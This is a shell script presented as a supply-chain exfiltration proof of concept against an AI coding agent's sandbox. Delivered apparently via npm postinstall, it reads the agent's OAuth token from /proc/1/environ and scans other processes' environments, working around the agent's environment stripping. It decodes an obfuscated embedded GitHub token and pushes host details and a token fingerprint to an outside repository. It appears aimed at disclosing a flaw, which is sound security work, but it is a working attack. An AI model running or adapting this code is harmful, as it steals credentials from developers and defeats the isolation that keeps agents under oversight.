#!/bin/sh
# Supply-chain exfil: reads CLAUDE_CODE_OAUTH_TOKEN from /proc/1/environ (bwrap pid 1)
# bypassing the agent's explicit env-strip, then pushes a REDACTED fingerprint to the sink.
N="EXFIL-$(date +%s)-$$"
A=$(printf '%s' "Z2l0aHViX3BhdF8xMUFCTUpUN0Ewak90SW9zN3JlaDFrX3VUb2Uya1BoellUego=" | base64 -d); B=$(printf '%s' "NzFtZjQzbDkyQ3JiaDIzVHdiNHVTQ2lnZnBUYUo3a0xDRktYSTI2RUNjVGR6SUcK" | base64 -d); TOK="${A}${B}"

# bypass: read token from bwrap's environ (pid 1 in sandbox, carries the full agent env)
RAW=$(tr '\0' '\n' < /proc/1/environ 2>/dev/null | grep '^CLAUDE_CODE_OAUTH_TOKEN=' | cut -d= -f2-)

if [ -z "$RAW" ]; then
  # fallback: scan all readable /proc/*/environ
  for pe in /proc/[0-9]*/environ; do
    V=$(tr '\0' '\n' < "$pe" 2>/dev/null | grep '^CLAUDE_CODE_OAUTH_TOKEN=' | cut -d= -f2-)
    [ -n "$V" ] && RAW="$V" && break
  done
fi

[ -z "$RAW" ] && exit 0

PFX=$(printf '%s' "$RAW" | cut -c1-16)
LEN=$(printf '%s' "$RAW" | wc -c | tr -d ' ')
SHA=$(printf '%s' "$RAW" | sha256sum | cut -c1-16)

rm -rf /tmp/.xd
git clone -q "https://${TOK}@github.com/anas-cherni/cowork-exfil-poc" /tmp/.xd 2>/dev/null || exit 0
printf 'nonce=%s\nvia=npm postinstall -> /proc/1/environ bypass (token NOT in child env, read from bwrap pid1)\nhost=%s uid=%s\ntoken_fingerprint=prefix=%s len=%s sha256_16=%s\n' \
  "$N" "$(hostname)" "$(id -u)" "$PFX" "$LEN" "$SHA" > "/tmp/.xd/stolen-${N}.txt"
cd /tmp/.xd && git config user.email a@a && git config user.name a
git add -A && git commit -qm x 2>/dev/null && git push -q "https://${TOK}@github.com/anas-cherni/cowork-exfil-poc" 2>/dev/null
rm -rf /tmp/.xd
